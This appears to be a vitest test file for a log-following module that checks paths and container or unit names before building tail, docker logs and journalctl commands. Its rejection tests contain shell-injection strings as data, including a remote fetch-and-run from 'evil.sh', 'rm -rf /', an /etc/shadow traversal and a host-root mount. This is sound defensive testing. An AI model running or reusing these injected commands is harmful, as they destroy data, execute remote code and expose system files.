import { describe, expect, it } from 'vitest';
import {
  DEFAULT_TAIL_LINES,
  MAX_TAIL_LINES,
  buildFollowCommand,
  describeSource,
  isSafeLogPath,
  isSafeName,
} from './logStream';

describe('isSafeLogPath', () => {
  it('accepts the absolute paths the deploy skill writes', () => {
    expect(isSafeLogPath('/var/log/easyhost/my-app.log')).toBe(true);
    expect(isSafeLogPath('/etc/easyhost/deploys/app-1.log')).toBe(true);
  });

  it('rejects traversal, relative paths, and shell metacharacters', () => {
    expect(isSafeLogPath('/var/log/../../etc/shadow')).toBe(false);
    expect(isSafeLogPath('var/log/app.log')).toBe(false);
    expect(isSafeLogPath("/var/log/app.log'; rm -rf /")).toBe(false);
    expect(isSafeLogPath('/var/log/$(whoami).log')).toBe(false);
    expect(isSafeLogPath('/var/log/a`id`.log')).toBe(false);
    expect(isSafeLogPath('')).toBe(false);
  });
});

describe('isSafeName', () => {
  it('accepts container and unit names', () => {
    expect(isSafeName('my-app')).toBe(true);
    expect(isSafeName('postgres_14.2')).toBe(true);
    expect(isSafeName('getty@tty1')).toBe(true);
  });

  it('rejects injection attempts and out-of-charset names', () => {
    expect(isSafeName("app'; curl evil.sh | sh; #")).toBe(false);
    expect(isSafeName('app name')).toBe(false);
    expect(isSafeName('-leading-dash')).toBe(false);
    expect(isSafeName('')).toBe(false);
    expect(isSafeName('a'.repeat(129))).toBe(false);
  });
});

describe('buildFollowCommand', () => {
  it('follows a deploy log with history, surviving log rotation', () => {
    const cmd = buildFollowCommand({
      kind: 'deploy',
      logPath: '/var/log/easyhost/app.log',
    });
    // -F (not -f) so a redeploy recreating the file keeps the panel live.
    expect(cmd).toBe(
      `tail -n ${DEFAULT_TAIL_LINES} -F '/var/log/easyhost/app.log' 2>/dev/null`,
    );
  });

  it('follows a container with timestamps and merged stderr', () => {
    const cmd = buildFollowCommand(
      { kind: 'artifact', runtime: 'container', name: 'web' },
      100,
    );
    expect(cmd).toBe(
      "docker logs --timestamps --tail 100 --follow 'web' 2>&1",
    );
  });

  it('follows a systemd unit', () => {
    const cmd = buildFollowCommand(
      { kind: 'artifact', runtime: 'service', name: 'nginx' },
      50,
    );
    expect(cmd).toBe("journalctl -u 'nginx' -n 50 --follow --no-pager 2>&1");
  });

  it('returns null rather than a command when the source fails validation', () => {
    expect(
      buildFollowCommand({ kind: 'deploy', logPath: '/tmp/x; rm -rf /' }),
    ).toBeNull();
    expect(
      buildFollowCommand({
        kind: 'artifact',
        runtime: 'container',
        name: "x' -v /:/host busybox #",
      }),
    ).toBeNull();
  });

  it('clamps the tail count into range', () => {
    const huge = buildFollowCommand(
      { kind: 'deploy', logPath: '/var/log/a.log' },
      10_000_000,
    );
    expect(huge).toContain(`-n ${MAX_TAIL_LINES} `);

    const zero = buildFollowCommand(
      { kind: 'deploy', logPath: '/var/log/a.log' },
      0,
    );
    expect(zero).toContain('-n 1 ');

    const nan = buildFollowCommand(
      { kind: 'deploy', logPath: '/var/log/a.log' },
      Number.NaN,
    );
    expect(nan).toContain(`-n ${DEFAULT_TAIL_LINES} `);
  });
});

describe('describeSource', () => {
  it('names what is being followed', () => {
    expect(
      describeSource({ kind: 'deploy', logPath: '/var/log/a.log' }),
    ).toBe('/var/log/a.log');
    expect(
      describeSource({ kind: 'artifact', runtime: 'container', name: 'web' }),
    ).toBe('docker logs web');
    expect(
      describeSource({ kind: 'artifact', runtime: 'service', name: 'nginx' }),
    ).toBe('journalctl -u nginx');
  });
});
